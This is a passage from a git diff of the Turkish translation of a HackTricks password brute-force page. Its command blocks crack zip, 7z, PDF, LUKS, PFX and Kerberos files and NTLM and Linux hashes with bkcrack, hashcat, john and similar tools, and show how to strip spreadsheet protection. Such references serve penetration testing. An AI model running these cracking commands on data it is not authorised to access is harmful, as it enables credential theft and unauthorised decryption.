+Şifreli zip içinde bulunan bir dosyanın **düz metnini** (veya düz metnin bir kısmını) bilmeniz gerekiyor. Şifreli zip içinde bulunan **dosya adlarını ve dosyaların boyutunu** kontrol etmek için şunu çalıştırabilirsiniz: **`7z l encrypted.zip`**\
+[**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)indirin.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
 zip plaintext.zip plaintext.file
@@ -564,8 +505,6 @@ zip plaintext.zip plaintext.file
 unzip unlocked.zip #User new_pwd as password
 ```
 ### 7z
-
-Brute force attacks can be used to crack passwords for 7z archives. Tools like **7z2hashcat** can convert 7z files to hashcat formats for easier cracking. Hashcat can then be used to perform the actual brute force attack.
 ```bash
 cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
 ```
@@ -577,8 +516,6 @@ apt-get install libcompress-raw-lzma-perl
 ./7z2john.pl file.7z > 7zhash.john
 ```
 ### PDF
-
-PDF dosyaları, genellikle metin belgeleri, elektronik kitaplar veya formlar gibi belgeleri depolamak ve paylaşmak için kullanılan popüler bir dosya biçimidir. PDF dosyaları genellikle şifrelenmez ve içeriğe erişimi sınırlamak için koruma önlemleri alınmaz. Bu nedenle, PDF brute force saldırıları genellikle şifrelenmemiş PDF dosyalarının şifresini kırmak için kullanılır. Bu saldırı türü, genellikle otomatik araçlar veya yazılımlar kullanılarak gerçekleştirilir ve şifre kombinasyonlarını deneyerek doğru şifreyi bulmaya çalışır.
 ```bash
 apt-get install pdfcrack
 pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
@@ -587,9 +524,9 @@ pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
 sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
-### PDF Sahibi Şifresi
+### PDF Sahibi Parolası
 
-PDF Sahibi şifresini kırmak için şu adrese bakın: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Bir PDF sahibi parolasını kırmak için bunu kontrol edin: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -623,11 +560,11 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Lucks görüntüsü
+### Luks resmi
 
 #### Yöntem 1
 
-Yükleme: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
+Kurulum: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
 bruteforce-luks -f ./list.txt ./backup.img
 cryptsetup luksOpen backup.img mylucksopen
@@ -643,7 +580,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-Başka bir Luks BF öğretici: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
+Başka bir Luks BF eğitimi: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
 ### Mysql
 ```bash
@@ -660,16 +597,16 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 <figure><img src="../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>
 
-### DPAPI Anahtarını Kırmak
+### DPAPI Master Key
 
-[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) adresini kullanın ve ardından john'u çalıştırın
+[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) kullanın ve ardından john
 
-### Open Office Şifre Korumalı Sütun
+### Open Office Pwd Protected Column
 
-Eğer bir xlsx dosyasında bir şifre ile korunan bir sütun varsa, şu adımları izleyerek şifreyi kaldırabilirsiniz:
+Eğer bir şifre ile korunan bir sütun içeren bir xlsx dosyanız varsa, onu korumasını kaldırabilirsiniz:
 
 * **Google Drive'a yükleyin** ve şifre otomatik olarak kaldırılacaktır
-* **Manuel olarak** kaldırmak için:
+* **Manuel olarak kaldırmak için**:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -688,8 +625,8 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **iş akışlarını otomatikleştirin**.\
-Bugün Erişim Edinin:
+Dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturmak ve **otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) kullanın.\
+Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
@@ -697,25 +634,25 @@ Bugün Erişim Edinin:
 
 **Hash örnekleri:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
-### Hash-identifier
+### Hash-tanımlayıcı
 ```bash
 hash-identifier
 > <HASH>
 ```
-### Kelime Listeleri
+### Wordlists
 
 * **Rockyou**
 * [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
 * [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 * [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Kelime Listesi Oluşturma Araçları**
+### **Wordlist Generation Tools**
 
-* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Yapılandırılabilir temel karakterler, tuş haritası ve rotalar ile gelişmiş klavye-tarama oluşturucusu.
+* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Konfigüre edilebilir temel karakterler, tuş haritası ve rotalar ile gelişmiş klavye yürüyüşü üreteci.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
-### John mutasyonu
+### John mutation
 
 _**/etc/john/john.conf**_ dosyasını okuyun ve yapılandırın
 ```bash
@@ -726,16 +663,16 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 #### Hashcat saldırıları
 
-* **Kelime listesi saldırısı** (`-a 0`) kurallarla
+* **Kelimeler listesi saldırısı** (`-a 0`) kurallarla
 
-**Hashcat**, zaten **kurallar içeren bir klasörle** birlikte gelir ancak [**burada başka ilginç kurallar bulabilirsiniz**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** zaten bir **kural içeren klasörle** birlikte gelir, ancak [**diğer ilginç kuralları burada bulabilirsiniz**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
-* **Kelime listesi kombinatörü** saldırısı
+* **Wordlist combinator** saldırısı
 
-Hashcat ile **2 kelime listesi birleştirilebilir**.\
-Eğer 1. liste **"hello"** kelimesini içeriyorsa ve ikinci liste **"world"** ve **"earth"** kelimelerini içeriyorsa, `helloworld` ve `helloearth` kelimeleri oluşturulacaktır.
+Hashcat ile **2 kelime listesini 1'e birleştirmek** mümkündür.\
+Eğer liste 1 **"hello"** kelimesini içeriyorsa ve ikinci liste **"world"** ve **"earth"** kelimeleriyle 2 satır içeriyorsa. `helloworld` ve `helloearth` kelimeleri oluşturulacaktır.
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -778,7 +715,7 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 ## Use it to crack the password
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
-* Kelime listesi + Mask (`-a 6`) / Mask + Kelime listesi (`-a 7`) saldırısı
+* Kelime listesi + Maske (`-a 6`) / Maske + Kelime listesi (`-a 7`) saldırısı
 ```bash
 # Mask numbers will be appended to each word in the wordlist
 hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
@@ -790,45 +727,19 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-### Linux Hash'lerini Kırmak - /etc/shadow Dosyası
-
-Linux'ta, kullanıcı parolaları `/etc/shadow` dosyasında şifrelenmiş olarak saklanır. Bu dosya, parolaların hash değerlerini içerir ve saldırganlar bu hash değerlerini kırarak kullanıcı parolalarını elde edebilirler.
+Linux Hash'lerini Kırma - /etc/shadow dosyası
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-# Brute Force
-
-## Windows Hashes
-
-### Introduction
-
-When it comes to cracking Windows hashes, brute force is a common technique used by hackers. Brute force involves systematically checking all possible passwords until the correct one is found. This method can be time-consuming but is often effective, especially if the password is weak.
-
-### Tools
-
-There are various tools available for brute forcing Windows hashes, such as **John the Ripper** and **Hashcat**. These tools use different algorithms and techniques to crack passwords, making them valuable resources for hackers attempting to gain unauthorized access to Windows systems.
-
-### Methodology
-
-The methodology for brute forcing Windows hashes typically involves creating a wordlist of potential passwords and using a tool like John the Ripper or Hashcat to systematically test each password against the hash. Hackers may also use rulesets to modify and combine words in the wordlist to increase the chances of success.
-
-### Conclusion
-
-Brute forcing Windows hashes can be a powerful technique for hackers looking to crack passwords and gain access to Windows systems. By using the right tools and methodologies, hackers can increase their chances of success in compromising Windows security.
+Windows Hash'lerini Kırma
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-# Kırma Ortak Uygulama Karma Değerleri
-
-Bir uygulamanın kimlik doğrulama işlemi sırasında kullanıcı parolalarını depolamak için genellikle karma değerleri kullanır. Bu karma değerleri, parolaların gerçek değerlerinin yerine geçen ve genellikle saldırganların parolaları çözmelerini zorlaştıran rastgele karakter dizileridir. Ancak, bazı durumlarda, bu karma değerleri basit veya yaygın parolalar kullanılarak oluşturulabilir.
-
-Örneğin, MD5, SHA-1 veya SHA-256 gibi yaygın olarak kullanılan karma algoritmaları, saldırganların bu karma değerlerini kaba kuvvet saldırılarıyla çözmelerine olanak tanır. Bu tür saldırılar, genellikle sözlük tabanlı saldırılar veya tüm olası kombinasyonları deneyen brute-force saldırıları şeklinde gerçekleştirilir.
-
-Bu nedenle, uygulama güvenliği testleri sırasında, karma değerlerinin güvenliğini değerlendirmek için kaba kuvvet saldırıları yapılması önemlidir. Bu saldırılar, zayıf veya yaygın parolaların kullanıldığı durumları tespit etmek ve uygulamanın güvenlik açıklarını gidermek için önemli bir adımdır.
+Yaygın Uygulama Hash'lerini Kırma
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -838,24 +749,25 @@ Bu nedenle, uygulama güvenliği testleri sırasında, karma değerlerinin güve
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
 ```
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Sıfırdan kahraman olmaya kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**]'yi (https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**]'i (https://opensea.io/collection/the-peass-family) içeren koleksiyonumuzu
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
 
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**]'i (https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
 Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
